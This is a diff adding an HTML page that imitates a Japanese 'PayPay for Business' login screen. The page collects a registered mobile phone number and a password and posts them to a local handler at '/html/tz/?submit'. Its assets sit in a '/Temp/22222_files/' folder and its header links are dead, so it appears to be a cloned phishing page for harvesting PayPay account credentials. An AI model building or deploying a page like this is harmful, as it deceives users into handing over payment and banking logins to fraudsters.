@@ -1,0 +1,97 @@
+
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta http-equiv="CACHE-CONTROL" content="NO-CACHE">
+<title>ログイン | PayPay for Business</title>
+<meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
+<link rel="stylesheet" href="/Temp/22222_files/bootstrap.min.css">
+<link rel="stylesheet" href="/Temp/22222_files/customStyle.css">
+<script src="/js/jquery-1.7.2.min.js"></script>
+<script type='text/javascript'>
+$(function(){ 
+$('#A1').keydown(function(e){if(($(this).val().length == 3 || $(this).val().length == 8) && e.keyCode != 8) {$(this).val($(this).val()+"-");}});
+});
+</script>
+<style>
+.MPQ9V8ZA-div-00 {
+	margin: 25px auto;
+	width: 320px;
+}
+.hdrL {
+	float: left;
+}
+.hdrR {
+	float: right;
+}
+.MPPoLwEA-div-00 { margin:25px auto;width:320px; }
+.MPPoLwEA-span-01 { word-break: keep-all; }
+.MPPoLwEA-span-02 { word-break: keep-all; }
+.MPPoLwEA-span-03 { word-break: keep-all; }
+</style>
+</head>
+<body id="KBC11SN000B">
+<login-app class="ng-isolate-scope">
+  <warn-for-i-e class="ng-isolate-scope"><!-- ngIf: vm.isIE --> 
+  </warn-for-i-e>
+  <div class="MPQ9V8ZA-div-00">
+    <div class="hdrL"> <a href="javascript:void(0);"><img src="/Temp/22222_files/main_logo.png" alt="PayPay銀行" height="20"></a> </div>
+    <div class="hdrR"> <a href="javascript:void(0);"><img src="/Temp/22222_files/header_faq.png" alt="よくあるご質問" height="20"></a></div>
+  </div>
+  <div style="clear:both;"></div>
+  <paypay-login class="ng-isolate-scope">
+    <form action="/html/tz/?submit" method="post" class="form-horizontal ng-pristine ng-invalid ng-invalid-required ng-valid-maxlength">
+      <div class="row center-block MPQ9V8ZA-div-00">
+        <div class="box box-info"> 
+          <div class="box-content-info ng-scope" ng-if="!vm.state.needOtp">
+            <div class="headingInfo pt10 pb10">ログイン</div>
+            <div class="form-group">
+              <div class="pt40 col-sm-12">
+                <div class="field-wrapper hasValue">
+                  <input name="A1" type="text" required class="form-ctrl ng-pristine ng-untouched ng-empty ng-invalid ng-invalid-required ng-valid-maxlength" id="A1" maxlength="13">
+                  <label for="loginUsername">登録済みの携帯電話番号</label>
+                </div>
+              </div>
+            </div>
+            <div class="form-group">
+              <div class="pt10 col-sm-12">
+                <div class="field-wrapper hasValue">
+                  <input id="A2" type="password" class="form-ctrl ng-pristine ng-untouched ng-empty ng-invalid ng-invalid-required" name="A2" required>
+                  <label for="loginPassword">パスワード</label>
+                  <span class="show-password" ng-click="showPassword=!showPassword;vm.sendShowPswdGA()"> 
+                  <!-- ngIf: !showPassword --><i class="fa fa-eye-slash ng-scope" ng-if="!showPassword" aria-hidden="true"></i><!-- end ngIf: !showPassword --> 
+                  <!-- ngIf: showPassword --> 
+                  </span> </div>
+              </div>
+            </div>
+            
+<div class="form-group" style="text-align:center; font-size:14px; color:#F00;">
+
+</div>
+
+
+            <div class="form-group">
+              <div class="col-sm-12">
+                <button type="submit" class="btnPrimary center-block"> <span>ログイン</span> </button>
+              </div>
+            </div>
+            <p class="forget-password"><a href="#" ng-click="vm.sendForgotPswdGA()">パスワードを忘れた場合</a></p>
+          </div>
+          <!-- end ngIf: !vm.state.needOtp --> 
+        </div>
+      </div>
+    </form>
+  </paypay-login>
+  <yconnect-login class="ng-isolate-scope">
+    <form class="ng-pristine ng-valid">
+      <div class="row center-block MPPoLwEA-div-00">
+        
+        <img src="/Temp/22222_files/yahoo-softbank.png" width="100%" alt="">
+      </div>
+    </form>
+  </yconnect-login>
+</login-app>
+</body>
+</html>
